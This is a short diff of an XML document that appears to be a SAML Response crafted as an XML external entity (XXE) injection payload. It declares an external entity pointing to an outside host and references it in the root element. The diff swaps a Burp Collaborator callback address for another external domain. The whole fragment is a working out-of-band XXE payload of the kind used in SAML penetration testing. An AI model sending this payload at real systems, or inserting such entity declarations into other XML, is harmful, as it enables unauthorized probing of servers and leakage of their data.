@@ -1,6 +1,6 @@
 
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://10pn7ed51u.burpcollaborator.net " >]>
+<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://codhers.com" >]>
 
 <foo>&xxe;
 <samlp:Response ID="d4_kS-guM6wiWqkSLdWESYZ8DGv"
